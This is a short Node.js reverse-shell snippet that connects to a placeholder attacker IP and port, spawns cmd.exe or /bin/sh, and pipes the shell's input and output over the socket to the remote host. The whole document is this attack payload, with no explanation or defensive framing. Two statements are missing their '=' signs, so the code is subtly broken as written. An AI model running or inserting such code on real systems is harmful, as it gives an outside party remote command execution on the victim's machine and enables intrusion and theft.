const net = require("net");

const { spawn} = require("child_process");

const client new net.Socket();

client.connect(attacker_port, "attacker_ip", () => {

const shell = process.platform === "win32" ? "cmd.exe": "/bin/sh";

const sh spawn (shell, []);

client.pipe(sh.stdin);

sh.stdout.pipe(client);

sh.stderr.pipe (client);

});